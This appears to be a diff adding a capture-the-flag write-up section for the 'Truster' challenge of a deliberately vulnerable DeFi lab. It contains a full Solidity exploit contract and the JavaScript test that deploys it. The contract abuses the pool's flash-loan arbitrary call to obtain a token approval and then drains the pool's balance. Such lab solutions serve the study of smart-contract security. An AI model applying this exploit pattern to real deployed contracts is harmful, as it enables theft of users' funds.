@@ -28,3 +28,41 @@ it('Exploit', async function () {
         
     });
 ```
+## Challenge #3 - Truster
+
+Create new contract _TrusterHack.sol_ 
+```
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "./TrusterLenderPool.sol";
+
+contract TrusterHack  {
+
+    function hack( address _pool, address _token, uint amount) public {
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        IERC20 token = IERC20(_token);
+
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)", address(this), amount
+        );
+
+        pool.flashLoan(0, msg.sender, _token, data);
+
+        token.transferFrom(_pool , msg.sender, token.balanceOf(_pool));
+    }
+}
+```
+
+truster.challenge.js : 
+```
+it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE  */
+        const _TrusterHack = await ethers.getContractFactory('TrusterHack', deployer);
+        const TrusterHackContract = await _TrusterHack.deploy();
+
+        await TrusterHackContract.connect(attacker).hack(this.pool.address, this.token.address, TOKENS_IN_POOL);        
+    });
+```
